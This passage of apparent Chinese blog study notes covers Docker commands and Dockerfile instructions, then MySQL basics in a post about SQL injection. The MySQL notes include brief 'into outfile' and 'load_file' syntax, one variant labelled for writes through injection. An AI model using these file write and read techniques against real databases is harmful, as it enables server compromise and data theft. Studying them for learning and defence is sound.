下载镜像命令"></a>docker pull 下载镜像命令</h4><blockquote><p>pull 译为：拉</p><p>用于将docker hub 中的镜像下载至docker中</p><p>例如： docker pull mysql</p><p>选项：</p><ul><li>-a 从镜像仓库下载所有镜像</li></ul><p>可选：**[:tag]** //指定下载的镜像版本，默认最新版</p><p><img src="image-20210410144056382.png" alt="image-20210410144056382"></p><p>指定下载版本：</p><p>docker pull mysql :5.7 (版本必须在docker hub 中存在)</p></blockquote><h4 id="docker-rmi-删除镜像命令"><a href="#docker-rmi-删除镜像命令" class="headerlink" title="docker rmi 删除镜像命令"></a>docker rmi 删除镜像命令</h4><blockquote><p>简单理解：rm 是linux系统的删除文件命令，i是images，所以<strong>rmi</strong>即为删除镜像</p><p>选项：</p><ul><li><p>**-f :**强制删除；</p><ul><li>**–no-prune :**不移除该镜像的过程镜像，默认移除；</li></ul></li><li><p>批量删除：<br> docker rmi -f $(docker image -aq)</p><p>  docker rmi -f 容器1 容器2 容器3 ……..</p></li></ul></blockquote><h4 id="docker-commit-命令从容器中下载镜像"><a href="#docker-commit-命令从容器中下载镜像" class="headerlink" title="docker commit 命令从容器中下载镜像"></a>docker commit 命令从容器中下载镜像</h4><blockquote><p>commit 译为：犯罪，承诺，保证</p><p>语法：docker commit [选项] 容器id 目标镜像名:版本号  [存放位置]</p><p>将我们改动后的容器下载成一个新的镜像</p><ul><li>**-a :**提交的镜像作者；</li></ul><ul><li>**-c :**使用Dockerfile指令来创建镜像；</li></ul><ul><li>**-m :**提交时的说明文字；</li></ul><ul><li>**-p :**在commit时，将容器暂停。</li></ul><p><img src="image-20210512151404838.png" alt="image-20210512151404838"></p></blockquote><h3 id="容器命令"><a href="#容器命令" class="headerlink" title="容器命令"></a>容器命令</h3><h4 id="docker-run-命令启动容器"><a href="#docker-run-命令启动容器" class="headerlink" title="docker run 命令启动容器"></a>docker run 命令启动容器</h4><blockquote><p>创建一个新的容器并运行一个命令</p><p>语法： docker run [选项] 镜像 [命令]</p><ul><li><strong>-a stdin:</strong> 指定标准输入输出内容类型，可选 STDIN/STDOUT/STDERR 三项；</li><li><strong>-d:</strong> 后台运行容器，并返回容器ID；</li><li><strong>-i:</strong> 以交互模式运行容器，通常与 -t 同时使用；</li><li><strong>-P:</strong> 随机端口映射，容器内部端口<strong>随机</strong>映射到主机的端口</li><li><strong>-p:</strong> 指定端口映射，格式为：<strong>主机(宿主)端口:容器端口</strong></li><li><strong>-t:</strong> 为容器重新分配一个伪输入终端，通常与 -i 同时使用；</li><li><strong>–name=”nginx-lb”:</strong> 为容器指定一个名称；</li><li><strong>–dns 8.8.8.8:</strong> 指定容器使用的DNS服务器，默认和宿主一致；</li><li><strong>–dns-search example.com:</strong> 指定容器DNS搜索域名，默认和宿主一致；</li><li><strong>-h “mars”:</strong> 指定容器的hostname；</li><li><strong>-e username=”ritchie”:</strong> 设置环境变量；</li><li><strong>–env-file=[]:</strong> 从指定文件读入环境变量；</li><li><strong>–cpuset=”0-2” or –cpuset=”0,1,2”:</strong> 绑定容器到指定CPU运行；</li><li>**-m :**设置容器使用内存最大值；</li><li><strong>–net=”bridge”:</strong> 指定容器的网络连接类型，支持 bridge/host/none/container: 四种类型；</li><li><strong>–link=[]:</strong> 添加链接到另一个容器；</li><li><strong>–expose=[]:</strong> 开放一个端口或一组端口；</li><li><strong>–volume , -v:</strong> 绑定一个卷</li></ul><p>选项：</p><p><img src="image-20210410214941892.png" alt="image-20210410214941892"></p></blockquote><blockquote><ul><li><p>注意：</p><p>  <img src="image-20210411171041896.png" alt="image-20210411171041896"></p></li></ul></blockquote><h4 id="docker-ps-查看容器运行情况"><a href="#docker-ps-查看容器运行情况" class="headerlink" title="docker ps 查看容器运行情况"></a>docker ps 查看容器运行情况</h4><blockquote><p>docker ps  查看当前正在运行的容器</p><p>选项：</p><ul><li><strong>-a :</strong> 显示所有容器，包括曾经运行的容器</li><li><strong>-f ：</strong>根据条件过滤显示的内容</li><li>**–format :**指定返回值的模板文件</li><li>**-l :**显示最近创建的容器</li><li>**-n :**列出最近创建的n个容器</li><li>**–no-trunc :**不截断输出</li><li>**-q :**静默模式，只显示容器ID</li><li>**-s :**显示总的文件大小</li></ul></blockquote><h4 id="退出容器"><a href="#退出容器" class="headerlink" title="退出容器"></a>退出容器</h4><blockquote><p>exit #直接退出容器</p><p>Ctrl + P + Q #容器不停止退出</p></blockquote><h4 id="docker-rm-命令删除容器："><a href="#docker-rm-命令删除容器：" class="headerlink" title="docker rm 命令删除容器："></a>docker rm 命令删除容器：</h4><blockquote><p>同linux删除文件命令，删除容器</p><p>语法：docker rm 容器id</p><ul><li>**-f :**通过 SIGKILL 信号强制删除一个运行中的容器。</li><li>**-l :**移除容器间的网络连接，而非容器本身。</li><li>**-v :**删除与容器关联的卷。</li></ul><p>删除正在运行的容器使用-f强制删除</p></blockquote><h4 id="docker-restart-stop-kill-命令启动-重启-停止-杀死-容器"><a href="#docker-restart-stop-kill-命令启动-重启-停止-杀死-容器" class="headerlink" title="docker restart/stop/kill 命令启动/重启/停止/杀死 容器"></a>docker restart/stop/kill 命令启动/重启/停止/杀死 容器</h4><blockquote><p>语法：docker start 容器id 启动一个或多个已经被停止的容器</p><p>语法：docker restart 容器id  重启容器</p><p>语法： docker stop 容器id 停止一个运行中的容器</p><p>语法： docker kill 容器id 杀死容器进程/强制停止</p><p>**-s :**向容器发送一个信号</p></blockquote><h4 id="其他命令"><a href="#其他命令" class="headerlink" title="其他命令"></a>其他命令</h4><h4 id="docker-logs查看日志"><a href="#docker-logs查看日志" class="headerlink" title="docker logs查看日志"></a>docker logs查看日志</h4><blockquote><p>语法：docker logs [options选项] 容器id</p><ul><li><strong>-f :</strong> 跟踪日志输出</li><li>**–since :**显示某个开始时间的所有日志</li><li><strong>-t :</strong> 显示时间戳</li><li>**–tail :**仅列出最新N条容器日志</li></ul><p><img src="image-20210411171858912.png" alt="image-20210411171858912"></p></blockquote><h4 id="docker-top-查看进程"><a href="#docker-top-查看进程" class="headerlink" title="docker top 查看进程"></a>docker top 查看进程</h4><blockquote><p>语法： docker top 容器id</p></blockquote><h4 id="docker-inspect-显示容器元信息"><a href="#docker-inspect-显示容器元信息" class="headerlink" title="docker inspect 显示容器元信息"></a>docker inspect 显示容器元信息</h4><blockquote><p>iinspect 译为：检查</p><p>语法 ：docker inspect 容器id</p><p>选项：</p><ul><li>**-f :**指定返回值的模板文件。</li><li>**-s :**显示总的文件大小。</li><li>**–type :**为指定类型返回JSON。</li></ul></blockquote><h4 id="进入正在运行的容器"><a href="#进入正在运行的容器" class="headerlink" title="进入正在运行的容器"></a>进入正在运行的容器</h4><h5 id="docker-exec"><a href="#docker-exec" class="headerlink" title="docker exec"></a>docker exec</h5><blockquote><p>docker exec  [选项] 容器命令</p><p>exec 译为：执行</p><p>在运行的容器中执行命令</p><p>例如：</p><pre class="line-numbers language-docker"><code class="language-docker">docker run <span class="token punctuation">-</span>d centosdocker exec <span class="token punctuation">-</span>it centos(id)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>**-d :**分离模式: 在后台运行</li><li>**-i :**即使没有附加也保持STDIN 打开</li><li>**-t :**分配一个伪终端</li></ul></blockquote><h5 id="docker-attach"><a href="#docker-attach" class="headerlink" title="docker attach"></a>docker attach</h5><blockquote><p>docker attach [选项] 容器</p><p>attach 译为：连接</p><p>连接到正在运行中的容器。</p><p>要attach上去的容器必须正在运行</p></blockquote><ul><li>注意：</li><li><img src="image-20210411174339114.png" alt="image-20210411174339114"></li></ul><h4 id="dcoker-cp-命令复制容器"><a href="#dcoker-cp-命令复制容器" class="headerlink" title="dcoker cp 命令复制容器"></a>dcoker cp 命令复制容器</h4><blockquote><p>**docker cp :**用于容器与主机之间的数据拷贝。</p><p>语法：docker cp [选项] 容器id：容器内路径 目的主机路径</p><p>**-L :**保持源目标中的链接</p><p>拷贝是一个手动的过程，使用卷可自动同步</p></blockquote><h4 id="docker-save-命令将容器打包到本机"><a href="#docker-save-命令将容器打包到本机" class="headerlink" title="docker save 命令将容器打包到本机"></a>docker save 命令将容器打包到本机</h4><blockquote><p>语法 docker save -o [目标文件夹名] [镜像]</p></blockquote><h3 id="小结"><a href="#小结" class="headerlink" title="小结:"></a>小结:</h3><p><img src="image-20210411175629753.png" alt="image-20210411175629753"></p><h2 id="容器的数据卷"><a href="#容器的数据卷" class="headerlink" title="容器的数据卷"></a>容器的数据卷</h2><h4 id="数据卷的意义"><a href="#数据卷的意义" class="headerlink" title="数据卷的意义"></a>数据卷的意义</h4><blockquote><p>数据卷就是对数据的同步</p><p>绑定数据卷后相当于在本地做了备份，即使容器被删除，数据依旧存在</p><p>无论在容器中修改卷目录中的文件还是本地修改，对应挂载卷的位置都会进行同步</p><p>挂载信息可以使用docker inspect 容器名/id 进行查看</p></blockquote><h4 id="run命令-v选项"><a href="#run命令-v选项" class="headerlink" title="run命令 -v选项"></a>run命令 -v选项</h4><blockquote><p>docker run -v 选项用于对数据卷进行挂载</p><p>语法格式：docker run -v 本地位置:容器位置 </p><p>-v选项还可以定义读写权限</p><p>用于限定容器和挂载位置的权限</p><ul><li>docker run -d -P –name=”nginx” -v 本地：容器：ro/rw(权限) 镜像名</li></ul><p>简单理解：将容器的某个或某些目录进行了备份，备份位置为指定的本地位置</p><p><img src="image-20210413220539366.png" alt="image-20210413220539366"></p></blockquote><h4 id="具名挂载与匿名挂载"><a href="#具名挂载与匿名挂载" class="headerlink" title="具名挂载与匿名挂载"></a>具名挂载与匿名挂载</h4><ul><li><p><strong>具名挂载</strong></p><blockquote><p>即挂载卷时定义了名称</p><p>语法：docker run -v name 路径 镜像名  即是具名挂载</p><ul><li><p>-v 选项不指定本地目录时，将挂载至随机目录</p><blockquote><p>在没有指定挂载目录时，默认挂载到 /var/lib/docker/volumes/ 目录下</p></blockquote></li><li><p>-P 选项用于随机映射端口</p></li></ul><p>通过具名挂载可以方便的找到一个卷</p></blockquote></li><li><p><strong>匿名挂载</strong></p><blockquote><p>挂载卷时未定义名称为匿名挂载</p><p>语法：docker run -v 路径 镜像名  既是匿名挂载</p></blockquote></li></ul><h4 id="docker-volume命令-管理卷"><a href="#docker-volume命令-管理卷" class="headerlink" title="docker volume命令 管理卷"></a>docker volume命令 管理卷</h4><blockquote><p>挂载数据到容器的两种命令之一</p><p>这里用于查看挂载的情况，具名挂载或匿名挂载</p><p>语法：docker volume ls</p><p><img src="image-20210414114309609.png" alt="image-20210414114309609"></p><p>这里的挂载方式都是匿名挂载，如果是具名挂载，volumne name 会显示我们自己定义的卷名</p></blockquote><h2 id="Dockerfile"><a href="#Dockerfile" class="headerlink" title="Dockerfile"></a>Dockerfile</h2><p>docker 就是用来构造镜像的文件 本质是命令脚本</p><p>docker file 脚本中每个指令忽略大小写，但建议使用大写</p><p>通过脚本可以生成一个镜像 </p><ul><li><p>步骤：</p><blockquote><p><img src="image-20210414143819811.png" alt="image-20210414143819811"></p><p>构建思路总结：</p><ul><li>基于什么</li><li>添加什么</li><li>构建环境</li><li>运行</li></ul></blockquote></li></ul><h4 id="脚本示例"><a href="#脚本示例" class="headerlink" title="脚本示例:"></a>脚本示例:</h4><pre class="line-numbers language-dockerfile"><code class="language-dockerfile">FROM centosMAINTAINER atmujieenv mypath /bin/bashworkdir $mypathrun yum -y install vimrun yun -y install net-toolsexpose 80cmd echo &mypath<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="docker-build-命令运行dockerfile构建镜像"><a href="#docker-build-命令运行dockerfile构建镜像" class="headerlink" title="docker build 命令运行dockerfile构建镜像"></a>docker build 命令运行dockerfile构建镜像</h4><blockquote><p>语法：docker build 选项【一般用 -f】 dockerfile文件路径 【其他命令】 构建成功的镜像名：版本 .</p><p>选项：</p><ul><li>**–build-arg=[] :**设置镜像创建时的变量；</li><li>**–cpu-shares :**设置 cpu 使用权重；</li><li>**–cpu-period :**限制 CPU CFS周期；</li><li>**–cpu-quota :**限制 CPU CFS配额；</li><li>**–cpuset-cpus :**指定使用的CPU id；</li><li>**–cpuset-mems :**指定使用的内存 id；</li><li>**–disable-content-trust :**忽略校验，默认开启；</li><li>**-f :**指定要使用的Dockerfile路径；</li><li>**–force-rm :**设置镜像过程中删除中间容器；</li><li>**–isolation :**使用容器隔离技术；</li><li>**–label=[] :**设置镜像使用的元数据；</li><li>**-m :**设置内存最大值；</li><li>**–memory-swap :**设置Swap的最大值为内存+swap，”-1”表示不限swap；</li><li>**–no-cache :**创建镜像的过程不使用缓存；</li><li>**–pull :**尝试去更新镜像的新版本；</li><li>**–quiet, -q :**安静模式，成功后只输出镜像 ID；</li><li>**–rm :**设置镜像成功后删除中间容器；</li><li>**–shm-size :**设置/dev/shm的大小，默认值是64M；</li><li>**–ulimit :**Ulimit配置。</li><li>**–squash :**将 Dockerfile 中所有的操作压缩为一层。</li><li><strong>–tag, -t:</strong> 镜像的名字及标签，通常 name:tag 或者 name 格式；可以在一次构建中为一个镜像设置多个标签。</li><li><strong>–network:</strong> 默认 default。在构建期间设置RUN指令的网络模式</li></ul></blockquote><h4 id="–volumes-from-选项实现容器间数据共享"><a href="#–volumes-from-选项实现容器间数据共享" class="headerlink" title="–volumes-from 选项实现容器间数据共享"></a>–volumes-from 选项实现容器间数据共享</h4><blockquote><p>docker run centos02 –volume-form centos01</p><p>简单理解：让两个容器相互同步</p></blockquote><h4 id="docker-指令"><a href="#docker-指令" class="headerlink" title="docker 指令"></a>docker 指令</h4><p><img src="image-20210414144838928.png" alt="image-20210414144838928"></p><ul><li><p>FROM</p><blockquote><p>指定构建所用的基础镜像，一切的开始</p></blockquote></li><li><p>MAINTAINER 译为：维修人员      新版以过期，改用LABELS</p><blockquote><p>说明镜像的作者，统一格式为姓名加邮箱</p></blockquote></li><li><p>RUN </p><blockquote><p>镜像构建时需要运行的命令</p></blockquote></li><li><p>ADD</p><blockquote><p>添加/集成镜像在基础镜像的基础上添加其他镜像或者内容</p><p>格式同COPY</p></blockquote></li><li><p>WORKDIR</p><blockquote><p>定义镜像的工作目录，一般默认为/bin/bash</p><pre><code>WORKDIR &lt;工作目录路径&gt;</code></pre></blockquote></li><li><p>VOLUME  译为：行李</p><blockquote><p>挂载卷，在主机设置备份</p><pre><code>VOLUME [&quot;&lt;路径1&gt;&quot;, &quot;&lt;路径2&gt;&quot;...]VOLUME &lt;路径&gt;</code></pre></blockquote></li><li><p>EXPOSE  译为：暴露</p><blockquote><p>指定暴露的端口 与-p 作用相同</p><pre><code>EXPOSE &lt;端口1&gt; [&lt;端口2&gt;...]</code></pre></blockquote></li><li><p>CMD</p><blockquote><p>指定容器启动时要运行的命令 ，可被替代【替换】</p><pre><code>CMD &lt;shell 命令&gt; CMD [&quot;&lt;可执行文件或命令&gt;&quot;,&quot;&lt;param1&gt;&quot;,&quot;&lt;param2&gt;&quot;,...] CMD [&quot;&lt;param1&gt;&quot;,&quot;&lt;param2&gt;&quot;,...]  # 该写法是为 ENTRYPOINT 指令指定的程序提供默认参数</code></pre></blockquote></li><li><p>ENTRYPOINT 译为：进入点，入口点</p><blockquote><p>指定容器启动时要运行的命令 ，存在多个时只有最后一个会生效，可以追加命令【追加】</p><p>可以搭配 CMD 命令使用：一般是变参才会使用 CMD ，这里的 CMD 等于是在给 ENTRYPOINT 传参</p><p>语法：</p><pre><code>ENTRYPOINT [&quot;&lt;executeable&gt;&quot;,&quot;&lt;param1&gt;&quot;,&quot;&lt;param2&gt;&quot;,...] //executeable 可执行的 param 参数</code></pre></blockquote></li><li><p>UNBUILD 译为：取消生成</p><blockquote><p>当继承一个DockerFile时，运行该指令。触发指令</p><pre><code>ONBUILD &lt;其它指令&gt;</code></pre></blockquote></li><li><p>COPY</p><blockquote><p>类似ADD，将我们的文件拷贝到镜像中</p><pre><code>COPY [--chown=&lt;user&gt;:&lt;group&gt;] &lt;源路径1&gt;...  &lt;目标路径&gt;COPY [--chown=&lt;user&gt;:&lt;group&gt;] [&quot;&lt;源路径1&gt;&quot;,...  &quot;&lt;目标路径&gt;&quot;]#&lt;源路径&gt;：源文件或者源目录，这里可以是通配符表达式，其通配符规则要满足 Go 的 filepath.Match 规则#&lt;目标路径&gt;：容器内的指定路径，该路径不用事先建好，路径不存在的话，会自动创建。COPY hom* /mydir/COPY hom?.txt /mydir/</code></pre></blockquote></li><li><p>ENV</p><blockquote><p>构建的时候设置环境变量</p><p>语法：</p><pre><code>ENV &lt;key&gt; &lt;value&gt;</code></pre></blockquote></li><li><p>注意：</p><blockquote><p>docker hub 中百分之99的镜像都以scratch镜像开始</p><p>[ ] 用于执行多行命令，用逗号分隔（也就是空格）</p><p>如：run [“./test.php”,”dev”,”offline”] 等同于 run ./test.php dev offline </p><p>&lt;命令行命令&gt; 等同于在终端操作的shell命令</p><p>Dockerfile 的指令每执行一次都会在 docker 上新建一层。所以过多无意义的层，会造成镜像膨胀过大。</p><p>FROM centos</p><pre class="line-numbers language-dockerfile"><code class="language-dockerfile">FROM centosRUN yum install wgetRUN wget -O redis.tar.gz "http://download.redis.io/releases/redis-5.0.3.tar.gz"RUN tar -xvf redis.tar.gz以上执行会创建 3 层镜像。可简化为以下格式：FROM centosRUN yum install wget \    && wget -O redis.tar.gz "http://download.redis.io/releases/redis-5.0.3.tar.gz" \    && tar -xvf redis.tar.gz<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如上，以 <strong>&amp;&amp;</strong> 符号连接命令，这样执行后，只会创建 1 层镜像。</p><p>docker build 命令最后一个 <strong>.</strong> 是上下文路径</p><p>是指 docker 在构建镜像，有时候想要使用到本机的文件（比如复制），docker build 命令得知这个路径后，会将路径下的所有内容打包。</p><p><strong>解析</strong>：由于 docker 的运行模式是 C/S。我们本机是 C，docker 引擎是 S。实际的构建过程是在 docker 引擎下完成的，所以这个时候无法用到我们本机的文件。这就需要把我们本机的指定目录下的文件一起打包提供给 docker 引擎使用。</p><p>如果未说明最后一个参数，那么默认上下文路径就是 Dockerfile 所在的位置。</p><p><strong>注意</strong>：上下文路径下不要放无用的文件，因为会一起打包发送给 docker 引擎，如果文件过多会造成过程缓慢。</p></blockquote></li></ul><h2 id="Docker网络原理"><a href="#Docker网络原理" class="headerlink" title="Docker网络原理"></a>Docker网络原理</h2><h2 id="IDEA整合Docker"><a href="#IDEA整合Docker" class="headerlink" title="IDEA整合Docker"></a>IDEA整合Docker</h2><h2 id="Docker-Compose"><a href="#Docker-Compose" class="headerlink" title="Docker Compose"></a>Docker Compose</h2><h2 id="Docker-Swarm"><a href="#Docker-Swarm" class="headerlink" title="Docker Swarm"></a>Docker Swarm</h2><h2 id="CI-CD-Jenkins"><a href="#CI-CD-Jenkins" class="headerlink" title="CI\CD Jenkins"></a>CI\CD Jenkins</h2>]]></content>
      
      
      
        <tags>
            
            <tag> 运维 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mysql数据库与sql注入学习笔记</title>
      <link href="/2020/12/08/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2020/12/08/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="MySQL基础"><a href="#MySQL基础" class="headerlink" title="MySQL基础"></a>MySQL基础</h1><h2 id="SQL-基础语句"><a href="#SQL-基础语句" class="headerlink" title="SQL 基础语句"></a>SQL 基础语句</h2><ul><li><p>连接数据库服务器  </p><blockquote><p>设置环境变量后直接终端输入mysql<br>格式：mysql -u [用户名] -p [密码]<br>或：mysql -u [用户名] -p （回车）<br>  密码：*********  </p></blockquote></li><li><p>查看数据库服务器中的数据库  </p><blockquote><p>show databases;  </p></blockquote></li><li><p>进入数据库  </p><blockquote><p>use [库名];  </p></blockquote></li><li><p>查看数据库</p><blockquote><p>查看数据库中的所有表<br>show tables;<br>查看库中一个表所有数据<br>select<em>from [表名];<br>查看表中指定列<br>select [列名] from [表名];<br>查看表中指定内容数据<br>selec</em>from [表名] where id=[指定值];  </p></blockquote></li><li><p>在数据库服务器中创建数据库  </p><blockquote><p>create [库名];  </p></blockquote></li><li><p>在数据库中创建表  </p><blockquote><p>create table [表名]<br>(<br>   [第一列列名] [数据类型(长度\值)],<br>   [第二列列名] [数据类型(长度\值)],<br>   ……..<br>   [第n列列名] [数据类型(长度\值)]<br>);  </p></blockquote></li><li><p>查看数据表详情  </p><blockquote><p>describe [表名];  </p></blockquote></li><li><p>向表中插入数据<br>insert into [表名]<br> values(“[第一行要输入的值]”,”[第二行要输入的值]”,”[第。。。要输入的值]”,”[最后一行要输入的值]”);  </p></li><li><p>删除命令  </p><blockquote><p>drop<br>删除数据库 drop database [库名];<br>删除数据库中的表 drop table [表名];  </p></blockquote></li><li><p>删除表中数据  </p><blockquote><p>delete from [表名] where [行名=内容];  </p></blockquote></li><li><p>修改表中数据  </p><blockquote><p>update [表名] set [行名=”修改后内容”];<br>alter table [表名] add/drop/change [字段名 值];</p></blockquote></li><li><p>写文件  </p><blockquote><p>into outfile<br>格式：select “hello world” into outfile “[文件名/绝对路径或相对路径分情况使用]”;<br>全新版本（注入写入）：select * from users into outfile “[路径+文件名]” lines terminated by “[字符串1]”;<br> //意为users表中每一行数据都以字符串一结尾。</p></blockquote></li><li><p>读文件  </p><blockquote><p>load_file<br>格式：select load_file “[要读取的文件]”;  </p></blockquote></li><li><p>注意：写入绝对路径时’/‘容易被作为转义符，所以通常需用到’//‘  </p></li><li><p>重命名</p><blockquote><p>rename<br>格式：rename tables/columns/databases “[表/列/数据库名]” to “[新名字]”;</p></blockquote></li><li><p>总结<br><img src="1.png" alt="1"></p></li></ul><h2 id="建表约束"><a href="#建表约束" class="headerlink" title="建表约束"></a>建表约束</h2><ul><li><p>主键约束 </p><blockquote><p>primary key<br>主键约束能唯一确定一张表中的一条记录<br>即我们通过给某个字段添加主键约束，就能确保该记录不重复且不为空。<br>例：<br>create table mujie<br>(<br>  id int primary key,<br>  name varchar(40);<br>);<br><img src="2.png" alt="2"></p></blockquote><blockquote><p>联合主键<br>同时定义多个主键约束，只要有一个不重复，那么两条记录就可以正常输入。<br>例如：<br>creste table mujie(id int,name varchar(20),message varchar(60),primary key(id,name));<br>该例子定义了俩个列为主键约束<br><img src="3.png" alt="3">此时，若输入两组name和id其中之一不同的数据，均可正常输入，只有两组数据name和id均相同，才无法输入。<br>注意：即使是联合主键，也不能有任意一项为空。  </p></blockquote></li><li><p>自增约束  </p><blockquote><p>auto_increment<br>与主键约束配合使用<br>例如：<br>  create table mujie<br>(<br>  id int primary key auto_increment,<br>  name varchar(40);<br>);   </p></blockquote></li></ul><ul><li><p>唯一约束<br>唯一约束如其字面意思，约束一列中不能出现重复数据。    </p><blockquote><p>命令 unique 英文译：独一无二的。  </p></blockquote><blockquote><p>使用方法与主键约束相同部分：<br>-联合唯一的用法与联合主键相同。<br>-用add添加约束与主键相同。<br>-用modify修改列从而修改约束与主键相同。  </p></blockquote><blockquote><p>使用方法与主键约束不同部分：<br>-删除唯一约束与删除主键约束不同<br>唯一约束的删除：<br>drop index //删除索引。<br>格式：<br>alter table [表名] drop index [列名];  </p></blockquote></li><li><p>非空约束  </p><blockquote><p>规定该列的内容不为空(NULL)</p></blockquote></li><li><p>修改创建完成的表    </p><ul><li>添加主键约束。  <blockquote><p>通过常用的添加操作添加主键约束。<br>alter table [表名] add <a href="%E5%88%97%E5%90%8D">约束</a>;<br>例如：alter table mujie add primary key(id); //给id这个列添加主键约束。  </p></blockquote></li></ul><blockquote><p>通过修改列添加主键约束。<br>alter table [表名]  modify [列名] [数据类型] <a href="%E5%88%97%E5%90%8D">约束</a>;<br>例如： alter table mujie modify id int primary key(id) auto_increment; //修改表mujie中的id列为整型<br>通过修改删除约束同理，不输入约束即可。  </p></blockquote><blockquote><p>alter table [表名] drop[约束]; //删除主键约束。<br>例如：alter table mujie drop primary key; //删除mujie这个表中的主键约束。  </p></blockquote></li></ul><h1 id="MYSQL-8-0-19新特性"><a href="#MYSQL-8-0-19新特性" class="headerlink" title="MYSQL:8.0.19新特性"></a>MYSQL:8.0.19新特性</h1><h2 id="MYSQL8安装"><a href="#MYSQL8安装" class="headerlink" title="MYSQL8安装"></a>MYSQL8安装</h2><p>phpstudy集成环境最高到mysql:8.0.12，而mysql:8.0.12并没有新增我们需要的新特性</p><p>安装方法</p><ul><li>windows 系统：官网下载安装包到本地，配置环境变量，初始化</li><li>linux 系统，同样官网安装</li><li>docker ： docker pull mysql:8.0.19</li></ul><p>这里我推荐使用docker 安装mysql:8.0.19</p><h3 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h3><p>安装镜像：</p><pre class="line-numbers language-docker"><code class="language-docker">sudo docker pull mysql<span class="token punctuation">:</span>8.0.19 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>docker run 容器:</p><pre class="line-numbers language-docker"><code class="language-docker">sudo docker run <span class="token punctuation">-</span><span class="token punctuation">-</span>name=<span class="token string">"mysql8"</span> <span class="token punctuation">-</span>p 3360<span class="token punctuation">:</span>3306 <span class="token punctuation">-</span>v /my/data/mysql8/<span class="token punctuation">:</span>/var/lib/mysql/ <span class="token punctuation">-</span>e MYSQL_ROOT_POSSWORD=root mysql<span class="token punctuation">:</span>8.0.19<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>卷挂载路径：</p><pre class="line-numbers language-docker"><code class="language-docker">/var/lib/mysql/  数据存储目录/etc/mysql/  mysql配置目录/var/log/  日志存储目录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>卷的具体挂载可自行选择</p><p>启动容器</p><pre class="line-numbers language-docker"><code class="language-docker">sudo docker start mysql8<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>进入容器</p><pre class="line-numbers language-docker"><code class="language-docker">sudo docker exec <span class="token punctuation">-</span>it mysql8 /bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>进入mysql8</p><pre class="line-numbers language-sq"><code class="language-sq">mysql -u root -proot<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>安装完成</p><h2 id="语句新增"><a href="#语句新增" class="headerlink" title="语句新增"></a>语句新增</h2><h3 id="table语句"><a href="#table语句" class="headerlink" title="table语句"></a>table语句</h3><ul><li><p>查询语句</p><p>  <strong>table [表名]；</strong></p><p>  同之前版本的select * from 【表名】; 都可以显示表的全部信息</p><p>  <img src="image-20210528173723745.png" alt="image-20210528173723745"></p><p>  支持语法：</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">TABLE</span> table_name <span class="token punctuation">[</span><span class="token keyword">ORDER</span> <span class="token keyword">BY</span> column_name<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token keyword">LIMIT</span> number <span class="token punctuation">[</span><span class="token keyword">OFFSET</span> number<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true">#该语句支持使用order by 和limit 语句进行查询</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>  order by </p><p>  <img src="image-20210528174058762.png" alt="image-20210528174058762"></p><p>  limit 1,2</p><p>  <img src="image-20210528174152993.png" alt="image-20210528174152993"></p></li></ul><h3 id="values语句"><a href="#values语句" class="headerlink" title="values语句"></a>values语句</h3><ul><li><p>官方语法：</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">VALUES</span> row_constructor_list <span class="token punctuation">[</span><span class="token keyword">ORDER</span> <span class="token keyword">BY</span> column_designator<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token keyword">LIMIT</span> <span class="token keyword">BY</span> number<span class="token punctuation">]</span>row_constructor_list:<span class="token keyword">ROW</span><span class="token punctuation">(</span>value_list<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">,</span> <span class="token keyword">ROW</span><span class="token punctuation">(</span>value_list<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span>value_list:<span class="token keyword">value</span><span class="token punctuation">[</span><span class="token punctuation">,</span> <span class="token keyword">value</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span>column_designator:column_index<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><p>解析：</p><ul><li><p>values row()语句：</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">values</span> <span class="token keyword">row</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>  构造一个虚拟表，值为1，2，3 row译为行</p><p>  这个语句可以构造多行数据</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">values</span> <span class="token keyword">row</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">row</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token 